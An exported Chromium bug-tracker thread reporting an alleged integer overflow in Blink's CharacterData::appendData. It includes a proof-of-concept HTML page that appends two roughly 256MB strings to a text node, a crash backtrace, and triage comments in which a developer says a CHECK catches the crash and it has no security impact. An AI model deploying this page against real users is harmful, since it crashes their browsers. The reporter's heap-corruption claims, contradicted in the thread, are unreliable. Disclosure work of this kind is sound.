@@ -1,0 +1,170 @@
+Issue ID: 427329358
+
+Author: ch...@google.com
+<h1>Steps to reproduce the problem</h1>
+<ol>
+<li>Create a minimal HTML file with the following content:</li>
+</ol>
+<div>&lt;!DOCTYPE html&gt;
+</div><div>&lt;html&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;utf-8&quot;&gt;
+  &lt;title&gt;Chromium CharacterData Integer Overflow PoC&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script&gt;
+function buildLargeString(targetSize) {
+  const chunk = &quot;A&quot;.repeat(1024 * 1024); // 1MB chunks
+  let s = &quot;&quot;;
+  while (s.length + chunk.length &lt; targetSize)
+    s += chunk;
+  s += &quot;A&quot;.repeat(targetSize - s.length); // Final pad
+  return s;
+}
+</div>
+<p>function crash() {
+try {
+const initialSize  = 0x0FFFFFF0;  // 268,435,424 bytes (~256MB - 16)
+const appendSize   = 0x10000000;  // 268,435,456 bytes (exactly 256MB)</p>
+<pre><code>const bigString    = buildLargeString(initialSize);
+const extraString  = buildLargeString(appendSize);
+
+const textNode = document.createTextNode(bigString);
+textNode.appendData(extraString);
+
+document.body.appendChild(textNode);
+console.log(document.body.offsetHeight); // Force layout
+</code></pre>
+<p>} catch (e) {
+console.error(&quot;Caught JS exception:&quot;, e);
+}
+}</p>
+<p>crash();
+<span>&lt;/script&gt;</span></p>
+<div>&lt;/body&gt;
+&lt;/html&gt;
+</div>
+<ol start="2">
+<li>
+<p>Open the HTML file in a debug or release build of Chromium (x64)</p>
+</li>
+<li>
+<p>Expected Result:
+No crash. The text node should be appended and rendered normally (or throw a handled DOMException in case of legitimate memory limits).</p>
+</li>
+</ol>
+<p>4.Actual Result:
+The browser crashes with error code STATUS_BREAKPOINT or shows the &quot;Aw, Snap!&quot; page. In some builds, this leads to heap corruption and invalid memory access due to integer overflow in internal text diffing logic.</p>
+<p>5.Crash Context:
+The crash is triggered due to an unsigned integer overflow in the calculation:
+TextDiffRange::Insert(this-&gt;data().length(), data.length());
+When offset + new_size exceeds UINT32_MAX, it wraps around silently because CheckValid() is compiled out in release builds (guarded by EXPENSIVE_DCHECKS_ARE_ON()).
+The corrupted range is later used during layout or mutation processing, eventually causing out-of-bounds access and crash.</p>
+<h1>Problem Description</h1>
+<p>Problem Description:
+An unsigned integer overflow vulnerability exists in Chromium&#39;s implementation of CharacterData::appendData() in the Blink engine. This flaw allows a crafted webpage to cause heap corruption and crash the browser, potentially leading to further security consequences such as out-of-bounds memory access.</p>
+<p>The root cause lies in the handling of large text nodes when appending data. Specifically, when the total size of the text after appending approaches or exceeds 2^32 (i.e., UINT32_MAX), calculations used in internal diffing and layout routines silently wrap due to the lack of bounds checking in release builds.</p>
+<p>In particular, the following internal call is unsafe:
+SetDataAndUpdate(new_str, TextDiffRange::Insert(this-&gt;data().length(), data.length()), kUpdateFromNonParser);</p>
+<p>Here, both this-&gt;data().length() and data.length() are unsigned int values. If their sum overflows 32-bit bounds, the resulting TextDiffRange&#39;s offset + new_size will wrap around, causing an incorrect or invalid memory region to be referenced.</p>
+<p>Although there is a function TextDiffRange::CheckValid(...) meant to validate the integrity of the diff ranges, this check is compiled out unless EXPENSIVE_DCHECKS_ARE_ON() is defined. Thus, in production builds, this logic does not catch the overflow, and corrupted state proceeds downstream.</p>
+<p>The impact can range from rendering failures to browser crashes, with console output such as:
+Aw, Snap! Something went wrong while displaying this webpage.
+Error code: STATUS_BREAKPOINT</p>
+<p>Or a JS exception like:
+Uncaught RangeError: Invalid string length</p>
+<h1>Summary</h1>
+<p>Integer overflow in CharacterData::appendData leads to heap corruption and browser crash</p>
+<h1>Custom Questions</h1>
+<h4>Type of crash:</h4>
+<p>Blink, dom</p>
+<h4>Crash state:</h4>
+<p>[14988:14832:0624/135456.985:FATAL:heap_allocator_impl.h(61)] Check failed: count &lt;= MaxElementCountInBackingStore<span>&lt;T&gt;</span>() (40265316 vs. 29797034)
+Backtrace:
+base::debug::CollectStackTrace [0x00007FF84D3487F2+18] (C:\b\s\w\ir\cache\builder\src\base\debug\stack_trace_win.cc:305)
+base::debug::StackTrace::StackTrace [0x00007FF84FD4477A+26] (C:\b\s\w\ir\cache\builder\src\base\debug\stack_trace.cc:218)
+logging::LogMessage::~LogMessage [0x00007FF84D19FA38+776] (C:\b\s\w\ir\cache\builder\src\base\logging.cc:601)
+logging::LogMessage::~LogMessage [0x00007FF84D1A2FB0+16] (C:\b\s\w\ir\cache\builder\src\base\logging.cc:594)
+blink::HeapAllocator::QuantizedSize<a href="javascript:void(0);" data-b-widget="url" data-b-original-href="about:invalid#zCSafez" data-b-redirected-href="about:invalid#zCSafez">blink::NGFragmentItemsBuilder::ItemWithOffset</a> [0x00007FF859AE5908+344] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\heap\heap_allocator_impl.h:61)
+WTF::VectorBufferBase<a href="javascript:void(0);" data-b-widget="url" data-b-original-href="about:invalid#zCSafez" data-b-redirected-href="about:invalid#zCSafez">blink::NGFragmentItemsBuilder::ItemWithOffset,blink::HeapAllocator</a>::AllocateBuffer [0x00007FF859AE55EA+26] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\wtf\vector.h:335)
+WTF::Vector<a href="javascript:void(0);" data-b-widget="url" data-b-original-href="about:invalid#zCSafez" data-b-redirected-href="about:invalid#zCSafez">blink::NGFragmentItemsBuilder::ItemWithOffset,128,blink::HeapAllocator</a>::ReserveInitialCapacity [0x00007FF859ADE779+25] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\platform\wtf\vector.h:1719)
+blink::NGFragmentItemsBuilder::NGFragmentItemsBuilder [0x00007FF859ADE214+2004] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\inline\ng_fragment_items_builder.cc:37)
+blink::NGBlockLayoutAlgorithm::LayoutWithItemsBuilder [0x00007FF859E31A16+342] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\ng_block_layout_algorithm.cc:490)
+blink::NGBlockLayoutAlgorithm::LayoutWithInlineChildLayoutContext [0x00007FF859E2BCE5+565] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\ng_block_layout_algorithm.cc:484)
+blink::NGBlockLayoutAlgorithm::Layout [0x00007FF859E2B947+279] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\ng_block_layout_algorithm.cc:459)
+blink::<code>anonymous namespace&#39;::CreateAlgorithmAndRun&lt;blink::NGBlockLayoutAlgorithm,</code>lambda at ../../third_party/blink/renderer/core/layout/ng/ng_block_node.cc:211:28&#39;&gt; [0x00007FF85626F5F6+310] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\ng_block_node.cc:122)
+blink::NGBlockNode::Layout [0x00007FF85624FC7A+4682] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\ng_block_node.cc:530)
+blink::<code>anonymous namespace&#39;::LayoutInflow [0x00007FF859E4A991+977] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\ng_block_layout_algorithm.cc:126) blink::NGBlockLayoutAlgorithm::HandleInflow [0x00007FF859E499B9+1993] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\ng_block_layout_algorithm.cc:1716) blink::NGBlockLayoutAlgorithm::Layout [0x00007FF859E2D9FB+7275] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\ng_block_layout_algorithm.cc:734) blink::NGBlockLayoutAlgorithm::Layout [0x00007FF859E2B950+288] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\ng_block_layout_algorithm.cc:462) blink::</code>anonymous namespace&#39;::CreateAlgorithmAndRun&lt;blink::NGBlockLayoutAlgorithm,<code>lambda at ../../third_party/blink/renderer/core/layout/ng/ng_block_node.cc:211:28&#39;&gt; [0x00007FF85626F5F6+310] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\ng_block_node.cc:122) blink::NGBlockNode::Layout [0x00007FF85624FC7A+4682] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\ng_block_node.cc:530) blink::LayoutNGMixin&lt;blink::LayoutProgress&gt;::UpdateInFlowBlockLayout [0x00007FF8591FFEED+973] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\layout_ng_mixin.cc:410) blink::LayoutNGBlockFlowMixin&lt;blink::LayoutRubyAsBlock&gt;::UpdateNGBlockLayout [0x00007FF859240924+68] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\ng\layout_ng_block_flow_mixin.cc:276) blink::LayoutBlock::UpdateLayout [0x00007FF85564F6B4+196] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\layout_block.cc:470) blink::LayoutBlockFlow::PositionAndLayoutOnceIfNeeded [0x00007FF8557B6168+1656] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\layout_block_flow.cc:838) blink::LayoutBlockFlow::LayoutBlockChild [0x00007FF8557B7F59+1513] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\layout_block_flow.cc:953) blink::LayoutBlockFlow::LayoutBlockChildren [0x00007FF8557B1FA4+1972] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\layout_block_flow.cc:1650) blink::LayoutBlockFlow::LayoutChildren [0x00007FF8557ACAD5+1237] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\layout_block_flow.cc:623) blink::LayoutBlockFlow::UpdateBlockLayout [0x00007FF8557AB89F+1183] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\layout_block_flow.cc:484) blink::LayoutView::UpdateBlockLayout [0x00007FF8524D19BD+2109] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\layout_view.cc:336) blink::LayoutBlock::UpdateLayout [0x00007FF85564F6B4+196] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\layout_block.cc:470) blink::LayoutView::UpdateLayout [0x00007FF8524D223D+1549] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\layout\layout_view.cc:377) blink::LocalFrameView::PerformLayout [0x00007FF852365E98+4184] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\frame\local_frame_view.cc:876) blink::LocalFrameView::UpdateLayout [0x00007FF85236871E+1438] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\frame\local_frame_view.cc:939) blink::LocalFrameView::UpdateStyleAndLayoutInternal [0x00007FF85238D523+1043] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\frame\local_frame_view.cc:3278) blink::LocalFrameView::UpdateStyleAndLayout [0x00007FF852371F90+560] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\frame\local_frame_view.cc:3214) blink::Document::UpdateStyleAndLayout [0x00007FF852438C10+800] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\dom\document.cc:2551) blink::Document::EnsurePaintLocationDataValidForNode [0x00007FF85243E1D8+216] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\dom\document.cc:2648) blink::HTMLElement::offsetHeightForBinding [0x00007FF85586468F+239] (C:\b\s\w\ir\cache\builder\src\third_party\blink\renderer\core\html\html_element.cc:1828) blink::</code>anonymous namespace&#39;::v8_html_element::OffsetHeightAttributeGetCallback [0x00007FF85E3ABCD3+53] (C:\b\s\w\ir\cache\builder\src\out\Release_x64\gen\third_party\blink\renderer\bindings\modules\v8\v8_html_element.cc:659)
+(No symbol) [0x00007FF7E7E4D6AD]</p>
+<h4>Reporter credit:</h4>
+<p>I would like to be credited by name and request both a CVE ID and consideration for a vulnerability reward (bug bounty).  Credit Name: QYdknow</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Not sure <br>
+Regression: N/A \</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: qi...@gmail.com
+Integer overflow in CharacterData::appendData leads to heap corruption and browser crash
+
+Author: qi...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: qi...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: qi...@gmail.com
+WVRVNE1UUTFOekZpT0RrMlpXSTRaV1pqTVRObE1tVXdOemN3TVdRMFpUST0=
+
+Author: qi...@gmail.com
+TkRJM016STVNelU0TFRZM01ERTNNVFkzTFRFMk5EVTNOekE1TWpnPQ==
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: cl...@appspot.gserviceaccount.com
+ClusterFuzz is analyzing your testcase. Developers can follow the progress at <a href="https://www.google.com/url?q=https://clusterfuzz.com/testcase?key%3D5659561146908672&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1A6obYuA_wRLf7SeSMOqkl" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://clusterfuzz.com/testcase?key=5659561146908672" data-b-redirected-href="https://www.google.com/url?q=https://clusterfuzz.com/testcase?key%3D5659561146908672&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1A6obYuA_wRLf7SeSMOqkl">https://clusterfuzz.com/testcase?key=5659561146908672</a>.
+
+Author: cl...@appspot.gserviceaccount.com
+public_non_google
+
+Author: 24...@project.gserviceaccount.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: 24...@project.gserviceaccount.com
+public_non_google
+
+Author: qi...@gmail.com
+WmpVMU9UUTRObUkyTnpkaVpqQmlZamd6WkdKbU5UbG1aRGxqTnpGbFlXUT0=
+
+Author: ca...@chromium.org
+Thanks for the report, since this is caught by the CHECK it does not have security implications since execution does not continue.
+
+Author: ca...@chromium.org
+public_non_google
+
+Author: ca...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: 24...@project.gserviceaccount.com
+ClusterFuzz testcase 5659561146908672 is still reproducing on the latest available build  r1481407.<br><br>If this testcase was not reproducible locally or unworkable, ignore this notification and we will file another bug soon with hopefully a better and workable testcase.<br><br>Otherwise, if this is not intended to be fixed (e.g. this is an intentional crash), please add the hotlistid:5433040 to prevent future bug filing with similar crash stacktrace.
+
+Author: 24...@project.gserviceaccount.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
